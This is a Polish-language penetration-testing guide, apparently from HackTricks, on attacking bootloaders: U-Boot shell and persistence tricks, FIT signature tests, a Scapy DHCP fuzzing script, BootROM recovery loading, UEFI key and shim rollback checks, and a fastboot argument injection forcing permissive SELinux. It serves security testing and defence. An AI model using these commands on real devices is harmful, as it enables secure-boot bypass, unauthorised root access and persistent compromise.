# Testowanie bootloadera

{{#include ../../banners/hacktricks-training.md}}

Poniższe kroki są zalecane podczas modyfikowania konfiguracji uruchamiania urządzenia i testowania bootloaderów, takich jak U-Boot i loadery klasy UEFI. Skoncentruj się na uzyskaniu wykonania kodu na wczesnym etapie, ocenie zabezpieczeń podpisów i ochrony przed rollbackiem oraz wykorzystaniu ścieżek recovery lub network-boot.

Powiązane: obejście secure-boot MediaTek za pomocą patchowania bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Szybkie wygrane w U-Boot i nadużywanie środowiska

1. Uzyskaj dostęp do powłoki interpretera
- Podczas bootowania naciśnij znany klawisz przerwania (często dowolny klawisz, 0, spację albo specyficzną dla płytki sekwencję „magiczną”) przed wykonaniem `bootcmd`, aby przejść do promptu U-Boot.<sup>[[1]](#references)</sup>

2. Sprawdź stan bootowania i zmienne
- Przydatne komendy:
- `printenv` (zrzut środowiska)
- `bdinfo` (informacje o płytce, adresy pamięci)
- `help bootm; help booti; help bootz` (obsługiwane metody bootowania kernela)
- `help ext4load; help fatload; help tftpboot` (dostępne loadery)

3. Zmodyfikuj argumenty bootowania, aby uzyskać root shell
- Dodaj `init=/bin/sh`, aby kernel uruchomił shell zamiast standardowego init:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Wykonaj netboot z serwera TFTP
- Skonfiguruj sieć i pobierz kernel/obraz fit z sieci LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Utrwal zmiany za pomocą środowiska
- Jeśli pamięć środowiska nie jest chroniona przed zapisem, możesz utrwalić kontrolę:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Sprawdź zmienne takie jak `bootcount`, `bootlimit`, `altbootcmd` i `boot_targets`, które wpływają na ścieżki awaryjne. Błędnie skonfigurowane wartości mogą umożliwiać wielokrotne przerwanie bootowania i przejście do shella.

6. Sprawdź funkcje debugowania i niebezpieczne funkcje
- Poszukaj: `bootdelay` > 0, wyłączonego `autoboot`, nieograniczonego `usb start; fatload usb 0:1 ...`, możliwości użycia `loady`/`loads` przez port szeregowy, `env import` z niezaufanych nośników oraz kernelów/ramdysków ładowanych bez weryfikacji podpisu.

7. Testowanie obrazu/weryfikacji U-Boot
- Jeśli platforma deklaruje secure/verified boot z obrazami FIT, wypróbuj zarówno obrazy niepodpisane, jak i zmodyfikowane:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Brak `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` lub zachowanie typu `verify=n` w trybie legacy często umożliwia bootowanie dowolnych payloadów.
- Nie kończ testu na prostym wyniku allow/deny: najnowsze badania FIT wykazały, że sama ścieżka weryfikacji może być powierzchnią ataku pre-auth. Wykonaj testy negatywne dla zewnętrznie przechowywanych danych FIT (`data-offset`, `data-position`, `data-size`), wyboru podpisanej konfiguracji, `loadables` oraz obsługi overlay / `extra-conf`.
- Jeśli masz pasujące drzewo źródeł, `test/vboot/vboot_test.sh` umożliwia szybkie odtworzenie zachowania weryfikacji FIT w sandboxie U-Boot przed rozpoczęciem pracy na rzeczywistym sprzęcie.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` i bootflows skryptów
- W nowoczesnych buildach U-Boot `bootcmd` często jest tylko wrapperem wokół Standard Boot. Oznacza to, że zapisywalne nośniki, PXE lub pamięć SPI flash mogą stać się właściwą granicą zaufania, nawet gdy widoczne środowisko wygląda nieszkodliwie.
- `extlinux` bootmeth wyszukuje `extlinux/extlinux.conf` w `/` i `/boot`; script bootmeth najpierw wyszukuje `boot.scr.uimg`, a następnie `boot.scr`. Podczas network boot nazwa skryptu może pochodzić z `boot_script_dhcp`.
- Przydatne komendy triage:
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- Testowane przypadki nadużycia: kontrolowane przez atakującego nośniki USB/SD umieszczone wcześniej w `boot_targets`, zapisywalny `/boot/extlinux/extlinux.conf`, złośliwy TFTP dostarczający `boot.scr` lub wykonywanie skryptu z pamięci SPI za pośrednictwem `script_offset_f`.
- Jeśli platforma korzysta z weryfikacji FIT, upewnij się, że konfiguracje są podpisane na poziomie konfiguracji, a nie tylko per-image; `required-mode=all` jest silniejsze niż akceptowanie dowolnego pojedynczego wymaganego klucza.

## Powierzchnia network-boot (DHCP/PXE) i złośliwe serwery

9. Fuzzing parametrów PXE/DHCP
- Obsługa BOOTP/DHCP w trybie legacy U-Boot miała problemy z bezpieczeństwem pamięci. Na przykład CVE‑2024‑42040 opisuje ujawnienie pamięci za pomocą spreparowanych odpowiedzi DHCP, które mogą wyciekać bajty z pamięci U-Boot z powrotem do sieci.<sup>[[4]](#references)</sup> Przetestuj ścieżki DHCP/PXE za pomocą nadmiernie długich wartości i przypadków brzegowych (opcja 67 bootfile-name, opcje vendor oraz pola file/servername) i obserwuj zawieszenia/wycieki.
- Minimalny fragment Scapy do obciążenia parametrów bootowania podczas netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Sprawdź również, czy pola nazwy pliku PXE są przekazywane do logiki shella/loadowania bez sanityzacji, gdy są łączone ze skryptami provisioningowymi po stronie OS.

10. Testowanie command injection przez złośliwy serwer DHCP
- Skonfiguruj złośliwą usługę DHCP/PXE i spróbuj wstrzyknąć znaki do pól nazwy pliku lub opcji, aby dotrzeć do interpreterów poleceń w późniejszych etapach łańcucha bootowania. Metasploit DHCP auxiliary, `dnsmasq` lub własne skrypty Scapy sprawdzają się dobrze. Najpierw odizoluj sieć laboratoryjną.

## Tryby recovery ROM SoC, które omijają standardowe bootowanie

Wiele SoC udostępnia tryb „loader” BootROM, który akceptuje kod przez USB/UART, nawet gdy obrazy flash są nieprawidłowe. Jeśli fuse’y secure-boot nie zostały przepalone, może to zapewnić arbitralne wykonanie kodu bardzo wcześnie w łańcuchu.

- NXP i.MX (Serial Download Mode)
- Narzędzia: `uuu` (mfgtools3) lub `imx-usb-loader`.
- Przykład: `imx-usb-loader u-boot.imx`, aby przesłać i uruchomić własny U-Boot z RAM.
- Allwinner (FEL)
- Narzędzie: `sunxi-fel`.
- Przykład: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` lub `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Narzędzie: `rkdeveloptool`.
- Przykład: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`, aby załadować loader i przesłać własny U-Boot.

Sprawdź, czy urządzenie ma przepalone eFuse/OTP secure-boot. Jeśli nie, tryby pobierania BootROM często omijają weryfikację wyższych warstw (U-Boot, kernel, rootfs), wykonując payload pierwszego etapu bezpośrednio z SRAM/DRAM.

## Bootloadery klasy UEFI/PC: szybkie testy

11. Testowanie modyfikacji ESP, rollbacku i rejestracji kluczy
- Zamontuj EFI System Partition (ESP) i sprawdź komponenty loadera: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi` oraz ścieżki logo producenta.
- Jeśli to możliwe, z systemu OS zrzucić stan Secure Boot i bazy kluczy:
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- Jeśli platforma jest w Setup Mode, akceptuje nieuwierzytelnioną rejestrację kluczy lub jest dostarczana z testowym/domyslnym Platform Key (klasa PKfail), lokalny administrator albo atakujący mający fizyczny dostęp może zarejestrować własny KEK/db i utrzymać pozornie „włączony” Secure Boot podczas bootowania dowolnych binariów EFI.<sup>[[3]](#references)</sup>
- Spróbuj bootowania ze starszymi lub znanymi podatnymi podpisanymi komponentami bootowania, jeśli unieważnienia Secure Boot (dbx) nie są aktualne. Jeśli platforma nadal ufa starym shimom/bootmanagerom, często można załadować własny kernel lub `grub.cfg` z ESP i uzyskać persistence.

12. Testowanie nieaktualnych unieważnień shim / SBAT / dbx
- Stare shimy podpisane przez Microsoft oraz forki producentów mogą nadal służyć jako ścieżka bootkita w stylu BYOVD, jeśli unieważnienia są nieaktualne. W odizolowanym labie umieść historycznie podatny shim na ESP i spróbuj chainloadować własny `grubx64.efi` lub kernel.<sup>[[11]](#references)</sup>
- Szybki triage:
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- Jeśli shim nadal się uruchamia mimo znajdowania się na liście unieważnień, firmware/OS ma nieaktualne aktualizacje `dbx` albo ufa forkowanemu loaderowi, który nigdy nie odziedziczył upstreamowych zabezpieczeń SBAT.

13. Błędy parsowania logo bootowania (klasa LogoFAIL)
- Firmware kilku producentów OEM/IBV było podatne na błędy parsowania obrazów w DXE, które przetwarza DXE boot logo. Jeśli atakujący może umieścić spreparowany obraz na ESP w ścieżce specyficznej dla producenta (np. `\EFI\<vendor>\logo\*.bmp`) i ponownie uruchomić urządzenie, wykonanie kodu podczas wczesnego bootowania może być możliwe nawet przy włączonym Secure Boot. Sprawdź, czy platforma akceptuje logo dostarczane przez użytkownika i czy te ścieżki są zapisywalne z poziomu OS.<sup>[[2]](#references)</sup>


## Luki zaufania Android/Qualcomm ABL + GBL (Android 16)

Na urządzeniach z Androidem 16, które używają ABL do ładowania **Generic Bootloader Library (GBL)**, sprawdź, czy ABL **uwierzytelnia** aplikację UEFI ładowaną z partycji `efisp`. Jeśli ABL sprawdza tylko **obecność** aplikacji UEFI i nie weryfikuje podpisów, primitive zapisu do `efisp` staje się **niesigned code execution przed OS** podczas bootowania.<sup>[[6]](#references)[[7]](#references)</sup>

Praktyczne testy i ścieżki nadużycia:

- **primitive zapisu do efisp**: Potrzebujesz sposobu zapisania własnej aplikacji UEFI do `efisp` (root/usługa uprzywilejowana, błąd aplikacji OEM, ścieżka recovery/fastboot). Bez tego luka w ładowaniu GBL nie jest bezpośrednio osiągalna.<sup>[[6]](#references)</sup>
- **Wstrzykiwanie argumentów fastboot OEM** (błąd ABL): Niektóre buildy akceptują dodatkowe tokeny w `fastboot oem set-gpu-preemption` i dołączają je do kernel cmdline. Można to wykorzystać do wymuszenia permisywnego SELinux, umożliwiając zapis do chronionych partycji:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Jeśli urządzenie jest załatane, komenda powinna odrzucać dodatkowe argumenty.<sup>[[5]](#references)[[6]](#references)</sup>
- **Odblokowanie bootloadera przez trwałe flagi**: Payload na etapie bootowania może zmienić trwałe flagi odblokowania (np. `is_unlocked=1`, `is_unlocked_critical=1`), emulując `fastboot oem unlock` bez bramek wymagających serwera/zgody OEM. Jest to trwała zmiana stanu po kolejnym restarcie.<sup>[[6]](#references)</sup>

Uwagi dotyczące obrony/triage:

- Potwierdź, czy ABL wykonuje weryfikację podpisu payloadu GBL/UEFI z `efisp`. Jeśli nie, traktuj `efisp` jako powierzchnię persistence wysokiego ryzyka.
- Sprawdź, czy handlery ABL fastboot OEM zostały załatane tak, aby **weryfikować liczbę argumentów** i odrzucać dodatkowe tokeny.<sup>[[8]](#references)[[9]](#references)</sup>

## Ostrzeżenia dotyczące sprzętu

Zachowaj ostrożność podczas pracy z pamięcią flash SPI/NAND na wczesnym etapie bootowania (np. przy zwieraniu pinów w celu ominięcia odczytów) i zawsze konsultuj się z datasheetem pamięci flash. Zwarcia wykonane w niewłaściwym momencie mogą uszkodzić urządzenie lub programmer.

## Uwagi i dodatkowe wskazówki

- Wypróbuj `env export -t ${loadaddr}` i `env import -t ${loadaddr}`, aby przenosić bloby środowiska między RAM a pamięcią masową; niektóre platformy pozwalają importować środowisko z wymiennych nośników bez uwierzytelniania.
- W celu uzyskania persistence w systemach opartych na Linuxie, które bootują przez `extlinux.conf`, często wystarczy zmodyfikować linię `APPEND` (aby wstrzyknąć `init=/bin/sh` lub `rd.break`) na partycji bootowania, jeśli nie są wymuszane kontrole podpisu.
- Jeśli cel używa aktualizacji dual-slot / A/B, przejrzyj techniki anti-rollback i desynchronizacji slotów w [przeglądzie analizy firmware](README.md), aby nie pominąć luk zaufania występujących wyłącznie w updaterze poza samym bootloaderem.
- Jeśli userland udostępnia `fw_printenv/fw_setenv`, sprawdź, czy `/etc/fw_env.config` odpowiada rzeczywistej pamięci środowiska. Błędnie skonfigurowane offsety umożliwiają odczyt/zapis do niewłaściwego regionu MTD.

## References

- [1] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Finding LogoFAIL: The dangers of image parsing during system boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Untrusted Platform Keys Undermine Secure Boot on UEFI Ecosystem](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040 Detail](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: Unlocking Xiaomi via two unsanitized strings](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL exploit lets attackers unlock bootloaders](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generic Bootloader (GBL) architecture](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Fix propagation of untrusted input into kernel cmdline](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: add check for set-hw-fence-value command](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Unfit to boot: breaking U-Boot's FIT signature verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Vulnerability Note VU#616257 - Microsoft-signed UEFI shim bootloaders vulnerable to Secure Boot bypass](https://kb.cert.org/vuls/id/616257)

{{#include ../../banners/hacktricks-training.md}}
